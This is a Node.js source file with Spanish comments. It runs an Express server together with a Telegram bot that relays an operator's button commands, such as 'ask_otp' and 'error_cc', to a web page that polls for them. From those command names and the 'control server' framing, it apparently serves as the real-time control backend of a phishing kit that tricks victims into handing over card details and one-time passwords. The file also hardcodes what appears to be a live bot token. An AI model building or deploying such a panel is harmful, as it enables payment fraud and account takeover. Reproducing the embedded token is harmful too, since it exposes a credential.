const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

// --- CONFIGURACIÓN ---
const PORT = 3001;
// Token del bot (Debe coincidir con el que usas en el HTML)
const TELEGRAM_TOKEN = '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Almacenamiento temporal de órdenes
let userCommands = {};

// --- INICIAR BOT EN MODO POLLING (SIN NGROK) ---
// Esto permite recibir los clics de los botones directamente en tu PC local
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

console.log("🤖 Iniciando Bot de Telegram en modo Polling...");

// Escuchar clics en botones inline (Callback Queries)
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data; // Ej: 'ask_otp', 'error_cc'
    const chatId = callbackQuery.message.chat.id;
    
    console.log(`[Telegram] Clic recibido: ${data} del chat: ${chatId}`);

    // Guardar el comando para que la web lo lea
    userCommands['current'] = data;

    // Responder a Telegram para quitar el relojito de carga del botón
    bot.answerCallbackQuery(callbackQuery.id)
        .catch(err => console.error("Error respondiendo callback:", err));
        
    // Opcional: Enviar mensaje de confirmación al chat
    // bot.sendMessage(chatId, `Procesando: ${data}`);
});

// Manejo de errores de polling (ej: si hay otra instancia corriendo)
bot.on('polling_error', (error) => {
    console.error(`[Polling Error] ${error.code}: ${error.message}`);
});

// --- SERVIDOR WEB PARA LA PÁGINA ---

// Endpoint que consulta la PÁGINA WEB (Polling desde el navegador)
app.get('/check-status', (req, res) => {
    // La página pregunta: "¿Hay algo para mí?"
    const command = userCommands['current'];
    
    if (command) {
        // Si hay comando, lo enviamos y lo borramos para no repetirlo
        res.json({ command: command });
        userCommands['current'] = null; 
        console.log(`[Web] Comando enviado a la página: ${command}`);
    } else {
        // Si no hay nada, respondemos vacío
        res.json({ command: null });
    }
});

// Endpoint para recibir comandos manuales (opcional, por si quieres probar con Postman)
app.post('/manual-command', (req, res) => {
    const { command } = req.body;
    if(command) {
        userCommands['current'] = command;
        console.log(`[Manual] Comando establecido: ${command}`);
        res.send(`Comando ${command} establecido.`);
    } else {
        res.status(400).send("Falta el parámetro 'command'");
    }
});

// Iniciar servidor Express
app.listen(PORT, () => {
    console.log(`✅ Servidor de Control corriendo en http://localhost:${PORT}`);
    console.log(`🚀 Listo para recibir botones de Telegram (Modo Polling activo)`);
});
